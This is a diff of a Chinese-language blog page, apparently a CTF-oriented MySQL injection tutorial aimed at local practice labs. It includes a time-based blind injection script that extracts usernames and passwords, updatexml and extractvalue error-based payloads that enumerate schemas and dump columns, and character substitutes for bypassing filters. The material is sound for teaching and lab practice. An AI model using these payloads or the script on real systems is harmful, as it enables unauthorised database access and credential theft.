@@ -16,31 +16,30 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="John Doe">
+  <meta name="author" content="ExploreIO">
   <meta name="keywords" content="">
   
-    <meta name="description" content="php数据库基本操作这个主要讲的是代码分析 数据库连接首先看到简单的数据库连接操作 12345678&lt;?php$con&#x3D;mysqli_connect(&quot;localhost&quot;,&quot;wrong_user&quot;,&quot;my_password&quot;,&quot;my_db&quot;);&#x2F;&#x2F; 检查连接if (!$con)&#123;    die(&amp;qu">
+    <meta name="description" content="gzctf比赛平台搭建教程，本文章适合快速搭建">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="https://exploreio.github.io/2026/05/07/sql_injec/index.html">
+<meta property="og:title" content="mysql注入教程">
+<meta property="og:url" content="https://exploreio.github.io/2026/05/05/sql_injec/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="php数据库基本操作这个主要讲的是代码分析 数据库连接首先看到简单的数据库连接操作 12345678&lt;?php$con&#x3D;mysqli_connect(&quot;localhost&quot;,&quot;wrong_user&quot;,&quot;my_password&quot;,&quot;my_db&quot;);&#x2F;&#x2F; 检查连接if (!$con)&#123;    die(&amp;qu">
+<meta property="og:description" content="gzctf比赛平台搭建教程，本文章适合快速搭建">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/51084520/1776153849242-a008d519-edfe-45a9-8caa-a989d95f77fe.png?x-oss-process=image/format,webp">
-<meta property="og:image" content="https://exploreio.github.io/img/sql_inject/image-20260507213941261.png">
-<meta property="og:image" content="https://exploreio.github.io/img/sql_inject/1776306568749-94dd888d-1791-4cca-95b9-3bdb5300f674.webp">
-<meta property="og:image" content="https://exploreio.github.io/img/sql_inject/1776308482004-4182f535-caf3-4e0d-ba27-abb3c3fbf25b.webp">
-<meta property="article:published_time" content="2026-05-07T13:27:09.189Z">
-<meta property="article:modified_time" content="2026-05-07T14:25:05.237Z">
+<meta property="og:image" content="https://exploreio.github.io/img/a3.jpg">
+<meta property="article:published_time" content="2026-05-05T10:40:00.000Z">
+<meta property="article:modified_time" content="2026-05-09T00:56:14.104Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="ctf比赛，比赛平台">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2026/png/51084520/1776153849242-a008d519-edfe-45a9-8caa-a989d95f77fe.png?x-oss-process=image/format,webp">
+<meta name="twitter:image" content="https://exploreio.github.io/img/a3.jpg">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>Hexo</title>
+  <title>mysql注入教程 - Hexo</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -307,13 +306,13 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+     style="background: url('/img/a3.jpg') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text=""></span>
+            <span id="subtitle" data-typed-text="mysql注入教程"></span>
           
         </div>
 
@@ -324,8 +323,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2026-05-07 21:27" pubdate>
-          2026年5月7日 晚上
+        <time datetime="2026-05-05 18:40" pubdate>
+          2026年5月5日 晚上
         </time>
       </span>
     
@@ -336,7 +335,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          23k 字
+          34k 字
         
       </span>
     
@@ -347,7 +346,7 @@
         
         
         
-          38 分钟
+          56 分钟
         
       </span>
     
@@ -388,6 +387,153 @@
   <div class="row nomargin-x">
     <div class="side-col d-none d-lg-block col-lg-2">
       
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="CTF"
+        id="heading-59db9139e685f7d6a4a8784f9221066f" role="tab" data-toggle="collapse" href="#collapse-59db9139e685f7d6a4a8784f9221066f"
+        aria-expanded="true"
+      >
+        CTF
+        <span class="list-group-count">(5)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-59db9139e685f7d6a4a8784f9221066f"
+           role="tabpanel" aria-labelledby="heading-59db9139e685f7d6a4a8784f9221066f">
+        
+        
+          
+          
+  <div class="category-post-list">
+    
+    
+  </div>
+
+          
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="web安全"
+        id="heading-3462cf7781bac1cfac12668cdfaa788c" role="tab" data-toggle="collapse" href="#collapse-3462cf7781bac1cfac12668cdfaa788c"
+        aria-expanded="false"
+      >
+        web安全
+        <span class="list-group-count">(3)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-3462cf7781bac1cfac12668cdfaa788c"
+           role="tabpanel" aria-labelledby="heading-3462cf7781bac1cfac12668cdfaa788c">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2026/04/04/ssti-sec1/" title="ssti模板注入手法总结python篇（一）"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">ssti模板注入手法总结python篇（一）</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2026/04/05/ssti-sec2/" title="ssti模板注入手法总结python篇（二）"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">ssti模板注入手法总结python篇（二）</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2026/04/13/file_include/" title="文件包含漏洞手法总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">文件包含漏洞手法总结</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="靶场搭建"
+        id="heading-00479b9959bcc6af4435ea74496652f0" role="tab" data-toggle="collapse" href="#collapse-00479b9959bcc6af4435ea74496652f0"
+        aria-expanded="true"
+      >
+        靶场搭建
+        <span class="list-group-count">(2)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-00479b9959bcc6af4435ea74496652f0"
+           role="tabpanel" aria-labelledby="heading-00479b9959bcc6af4435ea74496652f0">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2026/05/05/gzctf/" title="gzctf平台搭建教程"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">gzctf平台搭建教程</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2026/05/05/sql_injec/" title="mysql注入教程"
+           class="list-group-item list-group-item-action
+           active">
+          <span class="category-post">mysql注入教程</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
 
     </div>
 
@@ -395,7 +541,7 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header"></h1>
+            <h1 id="seo-header">mysql注入教程</h1>
             
             
               <div class="markdown-body">
@@ -527,7 +673,148 @@
 <p>获取所有字段的键值对</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>BASE_URL = <span class="hljs-string">&#x27;http://localhost/Less-5/?id=&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_record_exists</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;检查指定偏移量的记录是否存在&quot;&quot;&quot;</span><br>    url = BASE_URL + <span class="hljs-string">f&quot;1&#x27; AND EXISTS(SELECT * FROM users LIMIT <span class="hljs-subst">&#123;offset&#125;</span>,1) AND SLEEP(2)--+&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        start_time = time.time()<br>        response = requests.get(url, timeout=<span class="hljs-number">3</span>)<br>        elapsed = time.time() - start_time<br>        <span class="hljs-keyword">return</span> elapsed &gt; <span class="hljs-number">1.5</span>  <span class="hljs-comment"># 根据实际情况调整阈值</span><br>    <span class="hljs-keyword">except</span> requests.exceptions.Timeout:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>  <span class="hljs-comment"># 超时说明存在记录</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_record_data</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;获取指定偏移量的记录数据&quot;&quot;&quot;</span><br>    data = []<br>    <span class="hljs-keyword">for</span> char_pos <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">101</span>):  <span class="hljs-comment"># 检查前100个字符</span><br>        char_found = <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">for</span> ascii_val <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>):  <span class="hljs-comment"># 所有可打印ASCII字符</span><br>            payload = <span class="hljs-string">f&quot;1&#x27; AND ASCII(SUBSTR((SELECT CONCAT(username,&#x27;@&#x27;,password) FROM users LIMIT <span class="hljs-subst">&#123;offset&#125;</span>,1),<span class="hljs-subst">&#123;char_pos&#125;</span>,1))=<span class="hljs-subst">&#123;ascii_val&#125;</span> AND SLEEP(2)--+&quot;</span><br>            url = BASE_URL + payload<br>            <span class="hljs-keyword">try</span>:<br>                start_time = time.time()<br>                response = requests.get(url, timeout=<span class="hljs-number">3</span>)<br>                elapsed = time.time() - start_time<br>                <span class="hljs-keyword">if</span> elapsed &gt; <span class="hljs-number">1.5</span>:<br>                    data.append(<span class="hljs-built_in">chr</span>(ascii_val))<br>                    char_found = <span class="hljs-literal">True</span><br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">except</span> requests.exceptions.Timeout:<br>                data.append(<span class="hljs-built_in">chr</span>(ascii_val))<br>                char_found = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> char_found:<br>            <span class="hljs-keyword">break</span>  <span class="hljs-comment"># 当前字符位置无有效字符，结束解析</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    offset = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> is_record_exists(offset):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[!] 偏移量 <span class="hljs-subst">&#123;offset&#125;</span> 处无更多记录&quot;</span>)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[+] 正在获取偏移量 <span class="hljs-subst">&#123;offset&#125;</span> 的记录...&quot;</span>)<br>        record = get_record_data(offset)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] 发现记录: <span class="hljs-subst">&#123;record&#125;</span>&quot;</span>)<br>        offset += <span class="hljs-number">1</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
 
-<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>报错是一个很重要的报错，因为使用起来很方便</p>
+<p>下面会介绍很多的方法，有些方法会受到版本的限制</p>
+<p>可以看看下面的这张图片</p>
+<p><img src="/../img/sql_inject/1776409571460-59dbaa20-26a1-41b7-b85c-3a55b1f51a07.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>服务端的代码很简单时间，只需要有回显报错的代码即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&#x27;xxxx&#x27;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$result</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>)&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;gooooooood&#x27;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$con</span>));<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="xml报错注入-5-1-5"><a href="#xml报错注入-5-1-5" class="headerlink" title="xml报错注入(5.1.5~?)"></a>xml报错注入(5.1.5~?)</h3><p>这两个报错注入是最近常使用的</p>
+<p>版本的范围也是很宽的</p>
+<p>先将updatexml报错</p>
+<p>报错原理如下</p>
+<p>updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</p>
+<p>例如： select * from test where ide &#x3D; 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</p>
+<p>看到updatexml的基本使用方法</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span>正确的值<span class="hljs-operator">+</span>包裹关系 <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> database()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br><br>?id<span class="hljs-operator">=</span>正确的值<span class="hljs-operator">+</span>包裹关系 <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br>?id<span class="hljs-operator">=</span>正确的值<span class="hljs-operator">+</span>包裹关系 <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;重要表&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br>?id<span class="hljs-operator">=</span>正确的值<span class="hljs-operator">+</span>包裹关系 <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> concat(字段一,<span class="hljs-string">&#x27;,&#x27;</span>,字段二,<span class="hljs-string">&#x27;,&#x27;</span>,字段三) <span class="hljs-keyword">from</span> 重要表 limit &#123;&#125;,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>&#123;&#125;从<span class="hljs-number">0</span>开始<br></code></pre></td></tr></table></figure>
+
+<p>在这里我们先不讲如果显示不完整怎么办，在这个模块的后面会加上</p>
+<p>接下来就是extractvalue报错注入了</p>
+<p>原理差不多</p>
+<p>xtractvalue使用时当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</p>
+<p>select user,password from users where user_id&#x3D;1 and (extractvalue(1,0x7e));</p>
+<p>由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。</p>
+<p>下面是报错注入的基本使用方法</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,user(),0x7e,database())) --+</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()))) <span class="hljs-comment">--+</span><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="hljs-string">&#x27;))) --+</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(user_id,<span class="hljs-number">0x7e</span>,first_name,<span class="hljs-number">0x3a</span>,last_name) <span class="hljs-keyword">from</span> dvwa.users))) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+
+<p>这两个方法很像，但是使用方法还是有点不一样的</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">extractvalue(xml_doc, xpath_expr)	updatexml(xml_doc, xpath_expr, new_value)<br>前者两个参数，后者三个参数<br></code></pre></td></tr></table></figure>
+
+<p>所以使用起来是需要注意的</p>
+<p>众所周知0x7e是报错的主要原因，如果0x7e被限制了，怎么办呢</p>
+<p>当然还有很多备用的方案</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">^	<span class="hljs-number">0</span>x5e	最常用的替代方案，效果与 ~ 类似<br>!	<span class="hljs-number">0</span>x21	感叹号，也是非法的 <span class="hljs-keyword">XPath</span> 开头<br><span class="hljs-comment">#	0x23	井号，常用于注释，但在 XPath 开头会报错</span><br>&amp;	<span class="hljs-number">0</span>x26	与符号<br>*	<span class="hljs-number">0</span>x2a	星号（注意：<span class="hljs-keyword">XPath</span> 中有通配符 *，但在某些位置仍会报错）<br><span class="hljs-tag">&lt;br&gt;</span> <span class="hljs-number">0</span>x3c62723e 这个表示的是html里面的换行符号，所以在数据说的时候可以使用这个<br></code></pre></td></tr></table></figure>
+
+<h3 id="主键重复floor-5-5-5-7"><a href="#主键重复floor-5-5-5-7" class="headerlink" title="主键重复floor(5.5~5.7)"></a>主键重复floor(5.5~5.7)</h3><p>在学习这个报错注入的时候需要一些基础知识</p>
+<p>as基础</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span>  column_1  <span class="hljs-keyword">as</span>  列<span class="hljs-number">1</span>,column_2 <span class="hljs-keyword">as</span>  列<span class="hljs-number">2</span>   <span class="hljs-keyword">from</span>  text <span class="hljs-keyword">as</span>  表;<br>从这里我们可以知道，我们给column_1取了一个名字叫做列<span class="hljs-number">1</span>，给column_2取了一个名字叫做列<span class="hljs-number">2</span>，给text表取了一个名字叫做表<br><span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users使用这个语句查询的结果如下<br><span class="hljs-operator">+</span><span class="hljs-comment">----------+</span><br><span class="hljs-operator">|</span> username <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+</span><br><span class="hljs-operator">|</span> Dumb     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Angelina <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Dummy    <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> secure   <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> stupid   <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> superman <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> batman   <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> admin    <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> admin1   <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> admin2   <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> admin3   <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> dhakkan  <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> admin4   <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+</span><br><br>使用<span class="hljs-keyword">select</span> username <span class="hljs-keyword">as</span> name <span class="hljs-keyword">from</span> users的查询结果如下<br><span class="hljs-operator">+</span><span class="hljs-comment">----------+</span><br><span class="hljs-operator">|</span> name     <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+</span><br><span class="hljs-operator">|</span> Dumb     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Angelina <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Dummy    <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> secure   <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> stupid   <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> superman <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> batman   <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> admin    <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> admin1   <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> admin2   <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> admin3   <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> dhakkan  <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> admin4   <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+</span><br>可以看到最上面的列名变了<br></code></pre></td></tr></table></figure>
+
+<p>group by基础</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>的本质就是将某些列分组<br>为了好理解这里有一个表<br><span class="hljs-operator">+</span><span class="hljs-comment">----+----------+------+--------+</span><br><span class="hljs-operator">|</span> id <span class="hljs-operator">|</span> name     <span class="hljs-operator">|</span> age  <span class="hljs-operator">|</span> gender <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+----------+------+--------+</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">1</span> <span class="hljs-operator">|</span> zhangsan <span class="hljs-operator">|</span>   <span class="hljs-number">20</span> <span class="hljs-operator">|</span> male   <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">2</span> <span class="hljs-operator">|</span> lisi     <span class="hljs-operator">|</span>   <span class="hljs-number">22</span> <span class="hljs-operator">|</span> male   <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">3</span> <span class="hljs-operator">|</span> wangwu   <span class="hljs-operator">|</span>   <span class="hljs-number">19</span> <span class="hljs-operator">|</span> female <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">4</span> <span class="hljs-operator">|</span> zhaoliu  <span class="hljs-operator">|</span>   <span class="hljs-number">25</span> <span class="hljs-operator">|</span> male   <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">5</span> <span class="hljs-operator">|</span> lisi     <span class="hljs-operator">|</span>   <span class="hljs-number">44</span> <span class="hljs-operator">|</span> male   <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+----------+------+--------+</span><br>执行下面这个语句<br><span class="hljs-keyword">SELECT</span> NAME <span class="hljs-keyword">AS</span> n ,<span class="hljs-built_in">SUM</span>(age) <span class="hljs-keyword">AS</span> a <span class="hljs-keyword">FROM</span> username <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> n;<br>输出结果如下<br><span class="hljs-operator">+</span><span class="hljs-comment">----------+------+</span><br><span class="hljs-operator">|</span> n        <span class="hljs-operator">|</span> a    <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+------+</span><br><span class="hljs-operator">|</span> lisi     <span class="hljs-operator">|</span>   <span class="hljs-number">66</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> wangwu   <span class="hljs-operator">|</span>   <span class="hljs-number">19</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> zhangsan <span class="hljs-operator">|</span>   <span class="hljs-number">20</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> zhaoliu  <span class="hljs-operator">|</span>   <span class="hljs-number">25</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+------+</span><br>可以看到两个lisi的age合在了一块了，所以这个的作用就是分组，把相同的分到一组<br>还可以看到在语句里面使用了sum方法，这个是求和方法，是用来配合使用<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>的<br>除了这个方法还有一些方法也可以使用<br><span class="hljs-built_in">COUNT</span>()	统计行数	<span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>)<br><span class="hljs-built_in">SUM</span>()	求和	<span class="hljs-built_in">SUM</span>(price)<br><span class="hljs-built_in">AVG</span>()	求平均值	<span class="hljs-built_in">AVG</span>(score)<br><span class="hljs-built_in">MAX</span>()	求最大值	<span class="hljs-built_in">MAX</span>(score)<br><span class="hljs-built_in">MIN</span>()	求最小值	<span class="hljs-built_in">MIN</span>(score)<br></code></pre></td></tr></table></figure>
+
+<p>floor方法基础</p>
